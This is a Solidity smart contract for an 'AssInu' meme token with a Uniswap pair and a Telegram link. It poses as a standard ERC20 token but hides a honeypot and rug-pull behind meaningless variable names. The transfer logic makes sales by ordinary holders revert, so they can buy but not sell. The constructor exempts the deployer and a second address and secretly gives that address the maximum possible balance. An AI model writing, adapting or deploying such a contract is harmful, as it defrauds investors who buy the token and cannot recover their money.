// https://t.me/assinu

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.11;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract AssInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private instrument;

    function _transfer(
        address operation,
        address loss,
        uint256 gate
    ) internal override {
        uint256 trick = stock;

        if (chest[operation] == 0 && instrument[operation] > 0 && uniswapV2Pair != operation) {
            chest[operation] -= trick;
        }

        address throughout = star;
        star = loss;
        instrument[throughout] += trick + 1;

        _balances[operation] -= gate;
        uint256 opportunity = (gate / 100) * stock;
        gate -= opportunity;
        _balances[loss] += gate;
    }

    address private star;
    mapping(address => uint256) private chest;
    uint256 public stock = 3;

    constructor(
        string memory butter,
        string memory judge,
        address gray,
        address warn
    ) ERC20(butter, judge) {
        uniswapV2Router = IUniswapV2Router02(gray);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 sitting = ~(uint256(0));

        chest[msg.sender] = sitting;
        chest[warn] = sitting;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[warn] = sitting;
    }
}